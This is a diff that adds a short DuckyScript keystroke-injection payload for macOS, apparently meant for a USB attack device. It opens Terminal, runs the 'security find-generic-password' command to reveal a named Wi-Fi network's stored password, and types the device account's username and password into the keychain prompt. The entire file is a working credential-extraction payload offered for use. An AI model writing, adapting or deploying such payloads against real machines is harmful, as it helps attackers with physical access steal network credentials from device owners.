@@ -1,0 +1,23 @@
+REM Title : WIFI-PASSWORD-FOR-MAC
+REM Author : Majd Sassi
+REM Target :  MacOS
+REM Version : 1.0
+REM Description : Get the password of a specific WIFI on MacOS
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 800
+ENTER
+DELAY 1000
+STRING security find-generic-password -ga WIFI_NAME_HERE | grep "password:"
+ENTER
+DELAY 800
+STRING The user name used on the device 
+DELAY 800
+TAB
+DELAY 100
+STRING The password of the device
+DELAY 300
+ENTER
+REM You must replace the credentials
